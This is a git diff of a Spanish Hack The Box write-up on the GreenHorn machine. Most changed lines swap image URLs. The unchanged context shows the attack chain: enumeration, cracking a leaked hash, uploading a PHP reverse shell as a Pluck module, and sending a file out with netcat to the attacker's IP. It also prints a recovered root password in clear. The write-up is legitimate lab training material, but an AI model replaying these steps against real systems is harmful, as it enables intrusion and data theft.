@@ -5,7 +5,7 @@ excerpt:
 date: 2024-12-11
 classes: wide
 header:
-  teaser: https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/GreenHorn_avatar.png
+  teaser: https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/GreenHorn_avatar.png
   teaser_home_page: true
 categories:
   - hacking
@@ -35,7 +35,7 @@ como siempre vamos a empezar con un escaneo de nmap:
 ```bash
 nmap -p- --open --min-rate 5000 -vvv -n -Pn -sT 
 ```
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210195726.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210195726.png)
 
 ```bash
 nmap -sVC -p22,80,3000 10.10.11.25 -oN ports
@@ -131,22 +131,22 @@ Nmap done: 1 IP address (1 host up) scanned in 106.81 seconds
 en el puerto 3000 se esta ejecutando un software llamado gitea
 vemos que tiene un puerto 80 por lo que vamos a hacer un whatweb para ver que hay por hay
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210200304.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210200304.png)
 
 nos redirige a el dominio greenhorn.htb por lo que lo vamos a añadir a el etc/hosts
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210200552.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210200552.png)
 
 perfect
 
 repetimos el whatweb
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210200712.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210200712.png)
 
 vemos que nos a generado una cookie y que esta ejecutando la version 4.7.18 de pluck que es basicamente lo mismo que wordpress
 
 vale no veo mucho mas por lo que vamos para dentro
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210201344.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210201344.png)
 
 pone que la pagina esta en desarrollo y no veo ningun otro directorio o archivo a la vista por lo que voy a enumerar con gobuster
 
@@ -154,34 +154,34 @@ pone que la pagina esta en desarrollo y no veo ningun otro directorio o archivo 
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://greenhorn.htb/ -t 30 -x .php -s "200,301" -b ""
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210203312.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210203312.png)
 
 vemos varios archivos interesantes como admin.php o login.php
 en admin.php vemos lo siguiente
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210203512.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210203512.png)
 
 pone que no estamos logueados y de seguido nos redirigue a login.php
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210203549.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210203549.png)
 
 en los demas no hay nada mas interesante por el momento asique voy a saltar a la web del puesrto 3000
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210204554.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210204554.png)
 
 nos acemos un usuario generico y nos vamos a el directorio de explore
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210205038.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210205038.png)
 
 vemos un repositorio 
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210205519.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210205519.png)
 
 en el vemos lo siguiente
 es una estructura igual a la que aviamos sacado con gobuster de la pagina del puerto 80
 
 si nos ponemos a mirar el login.php encontramos algo interesante:
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210205655.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210205655.png)
 
 ```php
 //If password is not correct; display error, and store attempt in loginattempt file for brute-force protection.
@@ -202,7 +202,7 @@ por lo que nos toca ir buscando uno a uno
 
 vale en http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php encontramos esto:
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210211833.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210211833.png)
 
 vemos un hash y como decia en el anterior script es en sha512 por lo que vamos a intentar crakearlo
 
@@ -210,11 +210,11 @@ vemos un hash y como decia en el anterior script es en sha512 por lo que vamos a
 john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210212025.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210212025.png)
 
 vemos la contraseña por lo que ya podemos logearnos 
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210212119.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210212119.png)
 
 una vez dentro vemos lo siguiente (muy parecido a la maquina mist la verdad)
 
@@ -236,30 +236,30 @@ comprmimos el archivo:
 zip rever.zip rever.php
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210212545.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210212545.png)
 
 y ahora si nos vamos a http://greenhorn.htb/admin.php?action=installmodule y insertamos el .zip
 
 pero antes nos ponemos en escucha con netcat
 le damos a subir y pasado un rato
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210213608.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210213608.png)
 
 estamos dentro
 
 verificamos el /etc/passwd y vemos un usuario juniro 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210214048.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210214048.png)
 
 el cual su clave es la misma que habia en el hash por lo que podemos hacer un su junior 
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210214143.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210214143.png)
 y somos junior
 
 ## root
 
 muy bien si vamos al directorio home de junior encontramos lo siguiente
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211151852.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211151852.png)
 
 vamos a pasarnos el pdf a nuestra maquina atacante para poder verlo
 
@@ -272,17 +272,17 @@ y en la maquina victima
 ```bash
 nc 10.10.16.72 1234 < 'Using OpenVAS.pdf'
 ```
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211152414.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211152414.png)
 
 ya lo tenemos por lo que vamos a abrirlo
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153028.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153028.png)
 vemos que hay una contraseña pero que esta pixelada
 
 podemos usar una herramienta llamada deplix para quitar el pixelado
 
 para ello hacemos una captura a la parte pixelada
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153322.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153322.png)
 
 nos bajamos deplix
 https://github.com/spipm/Depix
@@ -293,11 +293,11 @@ y lo ejecutamos en mi caso de esta forma:
 python3 depix.py -p /home/zzero/GreenHorn/content/Captura\ de\ pantalla\ -2024-12-11\ 15-32-47.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o depixelated_text.png
 ```
 y nos da esto
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153657.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153657.png)
 
 que quiero entender que la contraseña es :
 sidefromsidetheothersidesidefromsidetheotherside
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153810.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153810.png)
 y si que lo es 
 por lo que somos root
